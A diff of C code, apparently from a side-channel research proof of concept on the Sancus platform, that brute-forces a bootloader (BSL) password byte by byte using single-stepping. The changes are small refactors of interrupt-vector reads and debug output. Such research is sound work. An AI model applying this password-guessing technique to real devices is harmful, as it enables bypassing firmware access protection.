@@ -14,8 +14,9 @@
 #define NOP_INTERVAL 11
 #define NOP_LATENCY 1
 
-char *ivt = (char*) INTERRUPT_VECTOR_START;
+char dummy_pwd[BSL_PASSWORD_LENGTH] = {0x02, 0x01};
 char guess[BSL_PASSWORD_LENGTH] = {0};
+char *ivt = (char*) INTERRUPT_VECTOR_START;
 
 unsigned int step = 1;
 unsigned int byte_index = 0;
@@ -41,11 +42,11 @@ int main(void)
     sancus_enable(&sm_bsl);
 
     char ivt_wrong1[BSL_PASSWORD_LENGTH], ivt_wrong2[BSL_PASSWORD_LENGTH];
-    for (int i = 0; i < BSL_PASSWORD_LENGTH; i++, ivt++)
+    for (int i = 0; i < BSL_PASSWORD_LENGTH; i++)
     {
-        pr_info2("ivt[%d] is 0x%x\n", i, *ivt & 0xff);
-        ivt_wrong1[i] = *ivt;
-        ivt_wrong2[i] = *ivt;
+        pr_info2("ivt[%d] is 0x%x\n", i, ivt[i] & 0xff);
+        ivt_wrong1[i] = ivt[i];
+        ivt_wrong2[i] = ivt[i];
     }
     ivt_wrong1[0] = 0xaa;
     ivt_wrong2[0] = 0xaa;
@@ -88,11 +89,11 @@ int main(void)
 
     for (byte_index = 0; byte_index < BSL_PASSWORD_LENGTH; byte_index++)
     {
-        pr_info1("Attacking password byte %02d\n", byte_index);
         correct = false;
 
         for (int pwd_byte = 0; pwd_byte < 256 && !correct; pwd_byte++)
         {
+            pr_info2("byte=%02d; guess=%02d\n", byte_index, pwd_byte);
             guess[byte_index] = (char) pwd_byte;
             step = 1;
             __ss_start();
